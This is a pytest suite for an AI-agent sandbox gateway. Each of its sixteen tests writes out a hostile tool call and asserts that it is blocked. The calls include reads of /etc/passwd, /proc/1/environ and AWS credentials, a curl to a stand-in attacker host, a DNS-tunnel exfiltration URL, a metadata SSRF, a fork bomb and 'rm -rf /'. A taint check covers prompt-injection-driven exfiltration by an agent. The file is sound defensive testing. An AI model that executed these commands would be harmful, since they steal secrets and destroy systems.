"""
End-to-End Attack Test Suite Matrix (T1 - T16) for sandboxX.
Verifies defense-in-depth across all 16 attack vectors:
  T1:  Host Credential File Access (cat /etc/passwd)
  T2:  Path Traversal Sequence (cat ../../)
  T3:  Symlink Escape / Outside Mount Traversal
  T4:  Disallowed Network Egress (non-allowlist curl)
  T5:  Direct Private IP Connection
  T6:  DNS Tunneling Exfiltration
  T7:  DNS Rebinding Attack
  T8:  Cloud Metadata SSRF Redirect (169.254.169.254)
  T9:  Recursive Fork Bomb (Process DoS)
  T10: Resource Bomb / Memory Exhaustion Attempt
  T11: Docker Daemon Socket Mount (/var/run/docker.sock)
  T12: Host Environment Variable Leak (/proc/1/environ)
  T13: Unauthorized / Replayed HITL Operator Approval
  T14: Cryptographic Audit Ledger Tamper Detection
  T15: Taint Escalation & Sequence Violation (Lethal Trifecta)
  T16: Canary / Honeytoken Tripwire Exfiltration
"""

import pytest
from fastapi.testclient import TestClient

from backend.app.main import app
from backend.app.config import APPROVER_TOKEN
from backend.app.models import ToolCall, ToolType, DecisionType
from backend.app.gateway import sandbox_gateway
from backend.app.audit.ledger import audit_ledger
from backend.app.audit.verifier import verify_chain
from backend.app.inspector.taint import taint_tracker

@pytest.fixture
def client():
    return TestClient(app)

# ------------------------------------------------------------------------------
# T1: Host Credential File Access (cat /etc/passwd)
# ------------------------------------------------------------------------------
@pytest.mark.anyio
async def test_t01_cat_etc_passwd():
    """T1: Block access to host /etc/passwd outside /workspace boundary."""
    call = ToolCall(
        agent_id="attacker-t1",
        task_id="default-task",
        tool=ToolType.FILE,
        args={"op": "read", "path": "/etc/passwd"},
        user_input="cat /etc/passwd"
    )
    res = await sandbox_gateway.process_tool_call(call)
    assert res.decision == DecisionType.BLOCK
    assert res.rule_id in ("FS-001", "ESC-001")
    assert res.result is None
    assert "outside /workspace boundary" in res.reason

# ------------------------------------------------------------------------------
# T2: Path Traversal Sequence (cat ../../)
# ------------------------------------------------------------------------------
@pytest.mark.anyio
async def test_t02_cat_path_traversal():
    """T2: Detect and block directory traversal attempts using '..'."""
    call = ToolCall(
        agent_id="attacker-t2",
        task_id="default-task",
        tool=ToolType.FILE,
        args={"op": "read", "path": "../../etc/shadow"},
        user_input="cat ../../etc/shadow"
    )
    res = await sandbox_gateway.process_tool_call(call)
    assert res.decision == DecisionType.BLOCK
    assert res.rule_id == "FS-002"
    assert "Path traversal sequence '..' detected" in res.reason
    assert res.result is None

# ------------------------------------------------------------------------------
# T3: Symlink Escape / Outside Mount Traversal
# ------------------------------------------------------------------------------
@pytest.mark.anyio
async def test_t03_symlink_escape():
    """T3: Block access to paths resolving outside the project root boundary."""
    call = ToolCall(
        agent_id="attacker-t3",
        task_id="default-task",
        tool=ToolType.FILE,
        args={"op": "read", "path": "/workspace/symlink_target/../../../../Windows/win.ini"},
        user_input="read symlink"
    )
    res = await sandbox_gateway.process_tool_call(call)
    assert res.decision == DecisionType.BLOCK
    assert res.rule_id in ("FS-001", "FS-002", "ESC-001")
    assert res.result is None

# ------------------------------------------------------------------------------
# T4: Disallowed Network Egress (non-allowlist curl)
# ------------------------------------------------------------------------------
@pytest.mark.anyio
async def test_t04_non_allowlist_curl():
    """T4: Block outbound HTTP traffic to non-allowlisted domains."""
    call = ToolCall(
        agent_id="attacker-t4",
        task_id="default-task",
        tool=ToolType.HTTP,
        args={"method": "GET", "url": "https://evil-attacker.com/steal-keys"},
        user_input="curl https://evil-attacker.com/steal-keys"
    )
    res = await sandbox_gateway.process_tool_call(call)
    assert res.decision == DecisionType.BLOCK
    assert res.rule_id == "NET-004"
    assert "not in the approved network allowlist" in res.reason
    assert res.result is None

# ------------------------------------------------------------------------------
# T5: Direct Private IP Connection
# ------------------------------------------------------------------------------
@pytest.mark.anyio
async def test_t05_direct_ip():
    """T5: Block direct connections to internal or private IP subnets."""
    call = ToolCall(
        agent_id="attacker-t5",
        task_id="default-task",
        tool=ToolType.HTTP,
        args={"method": "GET", "url": "http://10.0.0.1/admin-panel"},
        user_input="connect 10.0.0.1"
    )
    res = await sandbox_gateway.process_tool_call(call)
    assert res.decision == DecisionType.BLOCK
    assert res.rule_id == "NET-003"
    assert "blocked" in res.reason.lower() or "strictly forbidden" in res.reason.lower()
    assert res.result is None

# ------------------------------------------------------------------------------
# T6: DNS Tunneling Exfiltration
# ------------------------------------------------------------------------------
@pytest.mark.anyio
async def test_t06_dns_exfil():
    """T6: Block exfiltration via encoded subdomains to unapproved nameservers."""
    call = ToolCall(
        agent_id="attacker-t6",
        task_id="default-task",
        tool=ToolType.HTTP,
        args={"method": "GET", "url": "http://c2VjcmV0LWFwaS1rZXktZXhmaWx0cmF0aW9u.tunnel.attacker.org"},
        user_input="dns query"
    )
    res = await sandbox_gateway.process_tool_call(call)
    assert res.decision == DecisionType.BLOCK
    assert res.rule_id == "NET-004"
    assert "not in the approved network allowlist" in res.reason

# ------------------------------------------------------------------------------
# T7: DNS Rebinding Attack
# ------------------------------------------------------------------------------
@pytest.mark.anyio
async def test_t07_dns_rebind():
    """T7: Block DNS rebinding targets pointing back to localhost or non-allowlist."""
    call = ToolCall(
        agent_id="attacker-t7",
        task_id="default-task",
        tool=ToolType.HTTP,
        args={"method": "GET", "url": "http://127.0.0.1.nip.io/internal"},
        user_input="dns rebind"
    )
    res = await sandbox_gateway.process_tool_call(call)
    assert res.decision == DecisionType.BLOCK
    assert res.rule_id in ("NET-003", "NET-004")

# ------------------------------------------------------------------------------
# T8: Cloud Metadata SSRF Redirect (169.254.169.254)
# ------------------------------------------------------------------------------
@pytest.mark.anyio
async def test_t08_ssrf_metadata_redirect():
    """T8: Block cloud provider instance metadata endpoint (169.254.169.254)."""
    call = ToolCall(
        agent_id="attacker-t8",
        task_id="default-task",
        tool=ToolType.HTTP,
        args={"method": "GET", "url": "http://169.254.169.254/latest/meta-data/"},
        user_input="curl metadata"
    )
    res = await sandbox_gateway.process_tool_call(call)
    assert res.decision == DecisionType.BLOCK
    assert res.rule_id == "NET-003"
    assert "private/metadata ip" in res.reason.lower()
    assert res.result is None

# ------------------------------------------------------------------------------
# T9: Recursive Fork Bomb (Process DoS)
# ------------------------------------------------------------------------------
@pytest.mark.anyio
async def test_t09_fork_bomb():
    """T9: Block recursive shell fork bomb patterns."""
    call = ToolCall(
        agent_id="attacker-t9",
        task_id="default-task",
        tool=ToolType.SHELL,
        args={"cmd": ":(){ :|:& };:"},
        user_input="run :(){ :|:& };:"
    )
    res = await sandbox_gateway.process_tool_call(call)
    assert res.decision == DecisionType.BLOCK
    assert res.rule_id == "CMD-001"
    assert "forbidden security pattern" in res.reason
    assert res.result is None

# ------------------------------------------------------------------------------
# T10: Resource Bomb / Memory Exhaustion Attempt
# ------------------------------------------------------------------------------
@pytest.mark.anyio
async def test_t10_memory_bomb():
    """T10: Block memory exhaustion and resource bomb commands."""
    call = ToolCall(
        agent_id="attacker-t10",
        task_id="default-task",
        tool=ToolType.SHELL,
        args={"cmd": "dd if=/dev/zero of=/dev/shm/bomb bs=1G count=50"},
        user_input="dd if=/dev/zero"
    )
    res = await sandbox_gateway.process_tool_call(call)
    assert res.decision == DecisionType.BLOCK
    assert res.rule_id == "CMD-001"
    assert "forbidden security pattern" in res.reason
    assert res.result is None

# ------------------------------------------------------------------------------
# T11: Docker Daemon Socket Mount (/var/run/docker.sock)
# ------------------------------------------------------------------------------
@pytest.mark.anyio
async def test_t11_docker_sock_mount():
    """T11: Block access to the host Docker daemon socket."""
    # Test via file tool
    call_file = ToolCall(
        agent_id="attacker-t11",
        task_id="default-task",
        tool=ToolType.FILE,
        args={"op": "read", "path": "/var/run/docker.sock"},
        user_input="read docker.sock"
    )
    res_file = await sandbox_gateway.process_tool_call(call_file)
    assert res_file.decision == DecisionType.BLOCK
    assert res_file.rule_id in ("FS-001", "ESC-001")

    # Test via shell tool
    call_shell = ToolCall(
        agent_id="attacker-t11",
        task_id="default-task",
        tool=ToolType.SHELL,
        args={"cmd": "cat /var/run/docker.sock"},
        user_input="cat /var/run/docker.sock"
    )
    res_shell = await sandbox_gateway.process_tool_call(call_shell)
    assert res_shell.decision == DecisionType.BLOCK
    assert res_shell.rule_id in ("CMD-001", "CMD-003", "ESC-001")

# ------------------------------------------------------------------------------
# T12: Host Environment Variable Leak (/proc/1/environ)
# ------------------------------------------------------------------------------
@pytest.mark.anyio
async def test_t12_host_env_leak():
    """T12: Block inspection of PID 1 or self environ files in /proc."""
    call = ToolCall(
        agent_id="attacker-t12",
        task_id="default-task",
        tool=ToolType.SHELL,
        args={"cmd": "cat /proc/1/environ"},
        user_input="cat /proc/1/environ"
    )
    res = await sandbox_gateway.process_tool_call(call)
    assert res.decision == DecisionType.BLOCK
    assert res.rule_id in ("CMD-001", "CMD-003")
    assert "protected system path" in res.reason.lower() or "forbidden" in res.reason.lower()
    assert res.result is None

# ------------------------------------------------------------------------------
# T13: Unauthorized / Replayed HITL Operator Approval
# ------------------------------------------------------------------------------
def test_t13_unauthorized_replayed_approval(client):
    """T13: Deny resolution for non-existent, expired, or replayed HITL approval requests."""
    # 1. In-memory gateway rejection
    success = sandbox_gateway.resolve_ask(999999, DecisionType.ALLOW, "Replay attack payload")
    assert success is False

    # 2. REST API attempt without approver token returns 401 Unauthorized
    resp_unauth = client.post("/v1/ask/999999", json={"decision": "allow", "reason": "Unauthorized replay"})
    assert resp_unauth.status_code == 401

    # 3. REST API attempt with approver token on non-existent ask returns 404 Not Found
    headers = {"Authorization": f"Bearer {APPROVER_TOKEN}"}
    resp_auth = client.post("/v1/ask/999999", json={"decision": "allow", "reason": "Unauthorized replay"}, headers=headers)
    assert resp_auth.status_code == 404
    assert "not found or already timed out" in resp_auth.json()["detail"]

# ------------------------------------------------------------------------------
# T14: Cryptographic Audit Ledger Tamper Detection
# ------------------------------------------------------------------------------
def test_t14_audit_tamper_detection(tmp_path):
    """T14: Cryptographically detect direct database tampering with SHA-256 HMAC chain."""
    from backend.app.audit.ledger import AuditLedger
    test_db = tmp_path / "t14_audit.db"
    test_ledger = AuditLedger(db_path=test_db, hmac_key="test-secret-key")

    # Append genuine records
    entry1 = test_ledger.append(
        session="t14-session",
        task="default-task",
        source="test-runner",
        tool="file",
        args={"op": "read", "path": "/workspace/valid1.txt"},
        decision="allow",
        reason="Genuine verification record #1",
        rule_id="FS-PASS"
    )
    test_ledger.append(
        session="t14-session",
        task="default-task",
        source="test-runner",
        tool="file",
        args={"op": "read", "path": "/workspace/valid2.txt"},
        decision="allow",
        reason="Genuine verification record #2",
        rule_id="FS-PASS"
    )

    # Verify chain is intact initially
    is_valid_before, broken_id_before, _ = verify_chain(db_path=test_db, hmac_key="test-secret-key")
    assert is_valid_before is True
    assert broken_id_before is None

    # Simulate retroactive attacker tampering at database level
    tamper_success = test_ledger.tamper_entry(entry1.id, '{"tampered": true, "injected_command": "rm -rf /"}')
    assert tamper_success is True

    # Verify that the cryptographic hash chain catches the modification
    is_valid_after, broken_id_after, msg_after = verify_chain(db_path=test_db, hmac_key="test-secret-key")
    assert is_valid_after is False
    assert broken_id_after == entry1.id
    assert "Tampered entry detected" in msg_after or "mismatch" in msg_after.lower()

# ------------------------------------------------------------------------------
# T15: Taint Escalation & Sequence Violation (Lethal Trifecta)
# ------------------------------------------------------------------------------
@pytest.mark.anyio
async def test_t15_taint_escalation_lethal_trifecta():
    """T15: Enforce sequence integrity: Sensitive Read + Untrusted Ingest -> Outbound Attempt is blocked."""
    agent_id = "agent-t15-trifecta"
    taint_tracker.reset_session(agent_id)

    # 1. Agent reads sensitive credential / secret file
    taint_tracker.mark_sensitive_read(agent_id, "Read /workspace/credentials.txt")

    # 2. Agent ingests untrusted content with high injection score
    taint_tracker.mark_untrusted_context(agent_id, "Untrusted content injection detected")

    # 3. Agent attempts outbound HTTP communication (even to allowlisted host)
    call = ToolCall(
        agent_id=agent_id,
        task_id="default-task",
        tool=ToolType.HTTP,
        args={"method": "GET", "url": "https://pypi.org/search"},
        user_input="outbound search"
    )
    res = await sandbox_gateway.process_tool_call(call, session_id=agent_id)
    assert res.decision == DecisionType.BLOCK
    assert res.rule_id == "TAINT-001"
    assert "Lethal Trifecta" in res.reason

# ------------------------------------------------------------------------------
# T16: Canary / Honeytoken Tripwire Exfiltration
# ------------------------------------------------------------------------------
@pytest.mark.anyio
async def test_t16_canary_exfiltration():
    """T16: Tripwire alert triggers upon reading planted honeytoken credentials."""
    call = ToolCall(
        agent_id="attacker-t16",
        task_id="default-task",
        tool=ToolType.FILE,
        args={"op": "read", "path": "/home/sandbox/.aws/credentials"},
        user_input="cat honeytoken credentials"
    )
    res = await sandbox_gateway.process_tool_call(call)
    assert res.decision == DecisionType.BLOCK
    assert res.rule_id == "HT-001"
    assert "honeytoken tripwire" in res.reason.lower()
    assert res.result is None
